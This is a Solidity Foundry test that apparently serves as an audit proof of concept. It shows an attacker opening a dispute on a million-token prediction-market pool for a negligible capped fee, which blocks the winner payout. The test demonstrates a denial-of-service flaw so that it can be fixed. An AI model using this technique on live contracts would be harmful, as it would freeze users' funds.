// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import {
    RainPool
} from "../src/RainPool.sol";

import {
    RainDeployer
} from "../src/RainDeployer.sol";

import {
    RainFactory
} from "../src/RainFactory.sol";

import {
    IRainDeployer
} from "../src/interfaces/IRainDeployer.sol";

import {
    MockERC20,
    MockRainToken,
    MockFactory
} from "./mocks/DisputeMocks.sol";

contract DisputeFeeDoSTest is Test {
    RainDeployer public deployer;
    RainFactory public factory;
    MockERC20 public baseToken;
    MockRainToken public rainToken;
    MockFactory public mockFactory;

    address public owner = address(this);
    address public attacker = address(0xBEEF);
    address public platform = address(0x777);
    address public resolver = address(0x999);
    address public swapRouter = address(0x666);

    uint256 internal constant LARGE_POOL =
        1_000_000 ether;

    uint256 internal constant HARDCODED_CAP =
        1000 * 1e6;

    function setUp() public {
        baseToken = new MockERC20(
            "Mock DAI",
            "DAI",
            18
        );

        rainToken = new MockRainToken();
        factory = new RainFactory();
        mockFactory = new MockFactory();
        deployer = new RainDeployer();

        baseToken.mint(
            owner,
            LARGE_POOL
        );

        baseToken.mint(
            attacker,
            1 ether
        );

        deployer.initialize(
            address(factory),
            address(mockFactory),
            address(baseToken),
            platform,
            resolver,
            address(rainToken),
            swapRouter,
            18,
            12,
            25,
            1 ether,
            12,
            1
        );
    }

    function test_DisputeFeeCapFor18Decimals()
        public
    {
        RainPool pool =
            _createPool(LARGE_POOL);

        vm.warp(
            block.timestamp + 2 hours
        );

        vm.startPrank(attacker);

        baseToken.approve(
            address(pool),
            0.001 ether
        );

        pool.enterOption(
            1,
            0.001 ether
        );

        vm.stopPrank();

        vm.warp(
            block.timestamp + 2 days
        );

        pool.closePool();

        vm.prank(resolver);
        pool.chooseWinner(1);

        uint256 poolSize =
            pool.allFunds();

        uint256 expectedFee =
            (poolSize * 10) / 1000;

        emit log_named_decimal_uint(
            "Pool size",
            poolSize,
            18
        );

        emit log_named_decimal_uint(
            "Expected fee",
            expectedFee,
            18
        );

        emit log_named_decimal_uint(
            "Actual capped fee",
            HARDCODED_CAP,
            18
        );

        assertGt(
            expectedFee,
            HARDCODED_CAP
        );

        vm.startPrank(attacker);

        baseToken.approve(
            address(pool),
            HARDCODED_CAP
        );

        pool.openDispute();

        vm.stopPrank();

        assertTrue(
            pool.isDisputed()
        );

        assertEq(
            pool.winner(),
            0
        );

        emit log(
            "Pool disputed for 0.000000001 token"
        );
    }

    function test_EconomicImpact()
        public
        pure
    {
        uint256[] memory poolSizes =
            new uint256[](3);

        poolSizes[0] =
            100_000 ether;

        poolSizes[1] =
            1_000_000 ether;

        poolSizes[2] =
            10_000_000 ether;

        for (
            uint256 i;
            i < poolSizes.length;
            i++
        ) {
            uint256 expectedFee =
                (poolSizes[i] * 10) /
                1000;

            uint256 actualFee =
                expectedFee >
                    HARDCODED_CAP
                    ? HARDCODED_CAP
                    : expectedFee;

            emit log_named_decimal_uint(
                "Pool size",
                poolSizes[i],
                18
            );

            emit log_named_decimal_uint(
                "Expected fee",
                expectedFee,
                18
            );

            emit log_named_decimal_uint(
                "Actual fee",
                actualFee,
                18
            );
        }
    }

    function _createPool(
        uint256 initialLiquidity
    ) internal returns (RainPool) {
        uint256[] memory percentages =
            new uint256[](2);

        percentages[0] = 50;
        percentages[1] = 50;

        uint256 startTime =
            block.timestamp + 1 hours;

        IRainDeployer.Params memory params =
            IRainDeployer.Params({
                isPublic: true,
                resolverIsAI: false,
                poolOwner: owner,
                startTime: startTime,
                endTime: startTime + 1 days,
                numberOfOptions: 2,
                oracleEndTime: startTime + 3 days,
                ipfsUri: "ipfs://test",
                initialLiquidity: initialLiquidity,
                liquidityPercentages: percentages,
                poolResolver: resolver
            });

        baseToken.approve(
            address(deployer),
            initialLiquidity + 1 ether
        );

        return RainPool(
            deployer.createPool(params)
        );
    }
}
